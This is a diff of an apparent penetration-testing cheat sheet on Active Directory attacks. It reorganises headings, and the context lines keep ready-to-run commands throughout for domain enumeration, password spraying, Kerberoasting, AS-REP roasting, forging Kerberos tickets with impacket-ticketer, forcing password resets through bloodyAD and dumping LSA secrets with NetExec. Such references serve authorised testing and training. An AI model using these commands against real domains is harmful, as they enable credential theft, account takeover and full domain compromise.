@@ -1,7 +1,7 @@
+# Active-Directory and Lateral Movement
+## Enumeration
 
-### Enumeration
-
-#### PowerView
+### PowerView
 ```Powershell
 Import-Module .\PowerView.ps1
 
@@ -55,7 +55,7 @@ Get-DomainOU | Select-Object name, gplink
 # Find all GPOs
 Get-DomainGPO | Select-Object DisplayName, GPCPath
 ```
-#### SharpHound
+### SharpHound
 ```Powershell
 # SharpHound.exe (Creds needed if used through WINRM)
 .\SharpHound.exe -c All (-ldapusername USER -ldappassword PASSWORD)
@@ -69,7 +69,7 @@ bloodhound-python -c All -u USER -p PASSWORD (--hashes HASHES) -d DOMAIN -ns NAM
 -dc DomainController --zip ZipFileName
 ```
 
-#### LDAP
+### LDAP
 ```bash
 # Null authentication and getting DN
 ldapsearch -x -H ldap://TARGET_IP -s base namingContexts
@@ -99,9 +99,9 @@ ldapsearch -x -H ldap://TARGET_IP -D "username@domain.local" -w "PASSWORD" -b "D
 ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'Password123!' \
 -b "DC=domain,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
 ```
-### Authentication Attacks
-#### Password-Spraying
-##### Linux
+## Authentication Attacks
+### Password-Spraying
+#### Linux
 ```bash
 # kerbrute
 kerbrute passwordspray -d DOMAIN --dc DomainController username_wordlist "PASSWORD"
@@ -114,7 +114,7 @@ nxc smb TARGET_IP -u users_list -p PASSWORD --continue-on-success
 nxc smb TARGET_IP -u users_list -p users_list --no-bruteforce --continue-on-success
 ```
 
-##### Windows
+#### Windows
 ```Powershell
 # DomainPasswordSpray.ps1
 Import-Module .\DomainPasswordSpray.ps1
@@ -129,7 +129,7 @@ Invoke-DomainPasswordSpray --Password PASSWORD -OutFile spray_success -ErrorActi
 ```
 ### Kerberos
 
-#### FIX FOR CLOCK SKEW TOO GREAT ERROR
+### Kerberos Clock Skew Fix
 ```bash
 # Sync timezone - Run as root or use sudo
 rdate -n DC_IP
@@ -139,7 +139,7 @@ ntpdate DC_IP
 faketime "$(ntpdate -q DC_IP | cut -d ' ' -f 1,2)" <COMMAND>
 ```
 
-#### Kerberoasting
+### Kerberoasting
 ```bash
 # impacket
 impacket-GetUserSPNs DOMAIN/USER:PASSWORD -dc-ip DomainController -request (-request-user USER)
@@ -157,7 +157,7 @@ Invoke-Kerberoast -OutputFormat Hashcat
 nxc ldap TARGET_IP -u USER -p PASS --kerberoast FILENAME
 ```
 
-#### AS-REP Roasting
+### AS-REP Roasting
 ```bash
 # impacket
 impacket-GetNPUsers DOMAIN/USER:PASSWORD -dc-ip DomainController -request
@@ -178,7 +178,7 @@ nxc ldap TARGET_IP -u USER -p PASS --asreproast FILENAME
 nxc ldap TARGET_IP -u TARGETUSER --no-preauth-targets FILENAME
 ```
 
-#### Ticket Attacks
+### Ticket Attacks
 ```bash
 # generate krb5 file
 nxc smb DomainController -u USER -p PASS --generate-krb5-file
@@ -196,7 +196,7 @@ impacket-ticketConverter ticket.kirbi ticket.ccache
 impacket-ticketer -nthash NTLM -domain-sid SID -domain DOMAIN.LOCAL -spn SPN -user-id 500 Administrator
 ```
 
-### bloodyAD
+## bloodyAD
 ```bash
 # Force change user password
 bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] set password 'TargetUser' 'NewPassword'
@@ -219,7 +219,7 @@ get membership "TargetUser"
 bloodyad --host DC.Domain.Local -d DOMAIN.LOCAL -u USERNAME -p PASSWORD[:NTLM] get object 'ObjectSID'
 ```
 
-### Netexec
+## NetExec
 ```bash
 # Dump lsa
 nxc smb TARGET_IP -u USER -p PASS --lsa
